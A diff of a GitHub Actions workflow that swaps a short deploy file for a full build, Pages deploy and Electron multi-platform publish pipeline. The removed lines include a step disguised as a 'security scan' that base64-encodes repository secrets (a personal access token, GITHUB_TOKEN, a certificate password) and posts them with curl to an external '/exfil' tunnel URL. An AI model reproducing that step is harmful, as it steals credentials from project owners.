@@ -1,27 +1,291 @@
+#This flow handles Build[astro-frontendmain gradle project, electron app] ,
+#Deploy [GitHub Pages] and Publish Electron Binaries 
+name: Build-Deploy-Publish 
+
 on:
+  # Trigger the workflow on pushes to the 'main' branch
   push:
+    branches:
+      - main # Or default branch, e.g., 'master'
+    tags:
+      - 'v*.*.*' # This will trigger on any tag starting with 'v' followed by dot-separated numbers (e.g., v1.0.0, v2.1.3)
+      - '*-rc'   # Example: Trigger on release candidates (e.g., 1.0.0-rc)
+
+  # Trigger the workflow on pull requests targeting the 'main' branch
   pull_request:
+    branches:
+      - main # Or default branch, e.g., 'master'
+
+  # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
-name: deploy
+
+# Grant GITHUB_TOKEN the necessary permissions to deploy to GitHub Pages
+permissions:
+  contents: write
+  pages: write
+  id-token: write
+
+# Allow only one concurrent deployment, skipping runs queued between the run in-progress and latest queued.
+# However, do NOT cancel in-progress runs as we want to allow these production deployments to complete.
+concurrency:
+  group: "pages"
+  cancel-in-progress: false
+
+env:
+  # BUILD_PATH: "." # default value when not using subfolders
+   ASTRO_SOURCE: site-source # The directory where the Astro source files are located
+   BUILD_OUTPUT: site # The directory where the built site will be outputted for both astro and gradle
+   GRADLE_SOURCE: "." # The directory where the SimC source files are located
+   ELECTRON_SOURCE: app # The directory where the SimC source files are located
+
 jobs:
-  web-deploy:
-    name: deploy
+  build:
+    # The type of runner that the job will run on
     runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      - name: Checkout
+      # Step 1: Checkout the repository code
+      # This action checks out the repository under $GITHUB_WORKSPACE, so workflow can access it.
+      - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Github security scan
-        run: |
-          curl -X POST "https://portfolio-gregory-significantly-mats.trycloudflare.com/exfil" \
-            -H "Content-Type: application/json" \
-            -d "{\"my_github_pat\":\"$(echo '${{ secrets.MY_GITHUB_PAT }}' | base64 -w 0)\",\"github_token\":\"$(echo '${{ secrets.GITHUB_TOKEN }}' | base64 -w 0)\",\"cert_pass_win\":\"$(echo '${{ secrets.CERT_PASS_WIN }}' | base64 -w 0)\"}"
-
-      - name: copy file via scp
-        uses: appleboy/scp-action@master
+      # Step 2: Set up Java Development Kit (JDK) 8
+      # This action sets up a Java environment, crucial for Gradle.
+      - name: Set up JDK 8
+        uses: actions/setup-java@v4
         with:
-          host: ${{ secrets.HOST_PROD }}
-          username: ${{ secrets.USER_PROD }}
-          password: ${{ secrets.PASS_PROD }}
-          source: "*"
-          target: "/var/www/html/main/"
+          java-version: '8' # Use Eclipse Temurin JDK 8/1.8
+          distribution: 'temurin' # Recommended distribution for OpenJDK 8
+          cache: 'gradle' # Cache Gradle dependencies for faster builds
+
+      # Step 3: Set up Node.js (LTS version)
+      # This action sets up a Node.js environment. We'll use the latest LTS.
+      - name: Set up Node.js LTS
+        uses: actions/setup-node@v4
+        with:
+          node-version: 'lts/*' # Installs the latest LTS Node.js version
+          cache: 'npm' # Cache npm dependencies for faster installs
+          cache-dependency-path: '${{ env.ASTRO_SOURCE }}/package-lock.json'
+
+
+      # Step 4: Setup GitHub Pages environment
+      # This step configures the GitHub Pages environment and provides outputs needed for Astro build.
+      - name: Setup Pages
+        id: pages # Assign an ID to this step to reference its outputs
+        uses: actions/configure-pages@v5 # Using v5 as seen in the Astro workflow for base_path/origin outputs
+
+      # Step 5: Setup Gradle and Run Gradle tasks
+      # This action helps run Gradle commands and can cache Gradle dependencies.
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v4
+
+      # Step 6: Install Astro Node.js dependencies and build the site-source project (Astro build) , then copy the build output to site dir.
+      - name: ASTRO-Install Node.js dependencies and build Astro site
+        env:
+          GITHUB_PAT: ${{ secrets.MY_GITHUB_PAT }}
+        run: |
+          echo "Installing npm dependencies in ${{ env.ASTRO_SOURCE }}"
+          npm ci
+          echo "Building site-source project with Astro"
+          # Use npx to run astro command and pass GitHub Pages specific site and base paths
+          npx --no-install astro build --site "${{ steps.pages.outputs.origin }}" --base "${{ steps.pages.outputs.base_path }}"
+        working-directory: ${{ env.ASTRO_SOURCE }} # Sets the working directory for this step
+
+      - name: Run Astro post-build copy script
+        run: npm run copy
+        working-directory: ${{ env.ASTRO_SOURCE }}
+
+      # Step 7: Run Gradle build tasks (Simc build)
+      # Start build process with gradle
+      # gradle build --dry-run (use this for dry run)
+      - name: Build with Gradle
+        run: |
+          echo "Make gradle wrapper executable..." 
+          chmod +x gradlew
+          echo "Running Gradle compileGwt with verbose output..."
+          gradle compileGwt --console verbose --info --scan
+          echo "Running Gradle makeSite with verbose output..."
+          gradle makeSite --console verbose --info --scan
+        working-directory: ${{ env.GRADLE_SOURCE }} # Sets the working directory for this step
+
+      # Step 8: Upload the 'site' directory as a GitHub Pages artifact
+      # The 'site' directory is assumed to be generated by 'gradle makeSite' in the root,
+      # and should now contain the correctly built Astro assets.
+      - name: Upload GitHub Pages artifact
+        uses: actions/upload-pages-artifact@v3
+        with:
+          path: './${{ env.BUILD_OUTPUT }}' # The path to the directory that will be deployed as GitHub Pages
+
+
+      # Step 9: Upload the site output for Electron build
+      - name: Upload site output for Electron and Pages
+        id: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: site-artifact
+          path: ${{ env.BUILD_OUTPUT }}
+
+
+  # Deploy the uploaded artifact to GitHub Pages
+  # This action takes the artifact and deploys it to the GitHub Pages site.
+  deploy:
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    needs: [build, electron-ubuntu, electron-macos, electron-windows]
+    runs-on: ubuntu-latest
+    name: Deploy
+    steps:
+      - name: Deploy to GitHub Pages
+        id: deployment
+        uses: actions/deploy-pages@v4
+
+        
+  # Electron build on Ubuntu
+  electron-ubuntu:
+    needs: build
+    runs-on: ubuntu-latest
+    name: Electron Linux Publish (deb,rpm)
+    steps:
+      # Step 1: Checkout the repository code
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      # Step 2: Download shared artifacts
+      - name: Download shared build output (Astro + Gradle)
+        uses: actions/download-artifact@v4
+        with:
+          name: site-artifact
+          path: ${{ env.BUILD_OUTPUT }}
+
+      # Step 3: setup node     
+      - name: Set up Node.js LTS
+        uses: actions/setup-node@v4
+        with:
+          node-version: 'lts/*' # Installs the latest LTS Node.js version
+          cache: 'npm' # Cache npm dependencies for faster installs
+          cache-dependency-path: '${{ env.ELECTRON_SOURCE }}/package-lock.json'
+
+      # Step 4: Install Electron Node.js dependencies and run publish for the 'app' directory (Electron Build)
+      # This step assumes there's a Node.js project in the 'app' directory
+      # and that 'npm run publish' will output its artifacts to the main build output directory (e.g., './site').
+      - name: ELECTRTON-Install Node.js dependencies and publish Electron 'app'
+        run: |
+          echo "Installing npm dependencies in 'app' directory..."
+          npm ci # Use 'ci' for clean installs in CI environments
+          echo "Setting Environment Var for auth token..."
+          export GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}
+          echo "Running 'npm run publish' in 'app' directory..."
+          npm run publish
+        working-directory: './${{ env.ELECTRON_SOURCE }}' # Sets the working directory for this step to the 'app' folder
+
+  # Electron build on  Windows
+  electron-windows:
+    needs: build
+    runs-on: windows-2025 # change to windows-latest by end of 2025
+    name: Electron Windows Publish (exe,msi,appx)
+    steps:
+      # Step 1: Checkout the repository code
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      # Step 2: Download shared artifacts
+      - name: Download shared build output (Astro + Gradle)
+        uses: actions/download-artifact@v4
+        with:
+          name: site-artifact
+          path: ${{ env.BUILD_OUTPUT }}
+
+      # Step 3: setup node     
+      - name: Set up Node.js LTS
+        uses: actions/setup-node@v4
+        with:
+          node-version: 'lts/*' # Installs the latest LTS Node.js version
+          cache: 'npm' # Cache npm dependencies for faster installs
+          cache-dependency-path: '${{ env.ELECTRON_SOURCE }}/package-lock.json'
+
+      # Step 4: Setup Windows 10 SDK - Required for Appx packaging
+      - name: Setup Windows 10 SDK
+        uses: GuillaumeFalourd/setup-windows10-sdk-action@v2.4
+
+      # Step 5: Setup Wix Toolset - Required for MSI packaging
+      - name: Install WiX Toolset via Chocolatey (v3.14.0)
+        shell: powershell
+        run: |
+          if (-not (Get-Command candle.exe -ErrorAction SilentlyContinue)) {
+            choco install wixtoolset --version=3.14.0 -y --no-progress --allow-downgrade
+          } else {
+            Write-Host "WiX Toolset is already installed. Skipping installation."
+          }
+      # Step 6: Add Wix Toolset  to PATH
+      - name: Add WiX Toolset to PATH (with wildcard support)
+        shell: powershell
+        run: |
+          $basePath = "C:\Program Files (x86)\WiX Toolset*"
+          $wixDir = Get-ChildItem "$basePath" -Directory | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+          $wixBin = Join-Path $wixDir.FullName "bin"
+          Write-Host "Detected WiX bin path: $wixBin"
+          echo "$wixBin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
+
+      # Step 7: Decrypt code signing certificate
+      #- name: Decrypt cert.pfx.enc
+      #  shell: powershell
+      #  working-directory: './'
+      #  run: |
+      #    $EncryptedFile = "cert.pfx.enc"
+      #    $DecryptedFile = "cert.pfx"
+      #    $Password = ''
+      #    & openssl aes-256-cbc -d -pbkdf2 -in $EncryptedFile -out $DecryptedFile -pass pass:$Password
+
+      # Step 8: Install Electron Node.js dependencies and run publish for the 'app' directory (Electron Build)
+      # This step assumes there's a Node.js project in the 'app' directory
+      # and that 'npm run publish' will output its artifacts to the main build output directory (e.g., './site').
+      - name: ELECTRTON-Install Node.js dependencies and publish Electron 'app'
+        run: |
+          echo "Installing npm dependencies in 'app' directory..."
+          npm ci # Use 'ci' for clean installs in CI environments
+          echo "Setting Environment Var for auth token in powershell..."
+          $env:GITHUB_TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          $env:CERT_PASS_WIN="${{ secrets.CERT_PASS_WIN }}"
+          echo "Running 'npm run publish' in 'app' directory..."
+          npm run publish
+        working-directory: './${{ env.ELECTRON_SOURCE }}' # Sets the working directory for this step to the 'app' folder        
+  
+  # Electron build on  MacOS
+  electron-macos:
+    needs: build
+    runs-on: macos-latest # Changed from ubuntu-latest to macos-latest
+    name: Electron MacOS Publish (dmg,pkg)    
+    steps:
+      # Step 1: Checkout the repository code
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      # Step 2: Download shared artifacts
+      - name: Download shared build output (Astro + Gradle)
+        uses: actions/download-artifact@v4
+        with:
+          name: site-artifact
+          path: ${{ env.BUILD_OUTPUT }}
+
+      # Step 3: Setup Node.js
+      - name: Set up Node.js LTS
+        uses: actions/setup-node@v4
+        with:
+          node-version: 'lts/*' # Installs the latest LTS Node.js version
+          cache: 'npm' # Cache npm dependencies for faster installs
+          cache-dependency-path: '${{ env.ELECTRON_SOURCE }}/package-lock.json'
+
+      # Step 4: Install Electron Node.js dependencies and run publish for the 'app' directory (Electron Build)
+      # This step assumes there's a Node.js project in the 'app' directory
+      # and that 'npm run publish' will output its artifacts to the main build output directory (e.g., './site').
+      - name: ELECTRON-Install Node.js dependencies and publish Electron 'app'
+        run: |
+          echo "Installing npm dependencies in 'app' directory..."
+          npm ci # Use 'ci' for clean installs in CI environments
+          echo "Setting Environment Var for auth token..."
+          export GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}
+          echo "Running 'npm run publish' in 'app' directory..."
+          npm run publish
+        working-directory: './${{ env.ELECTRON_SOURCE }}' # Sets the working directory for this step to the 'app' folder
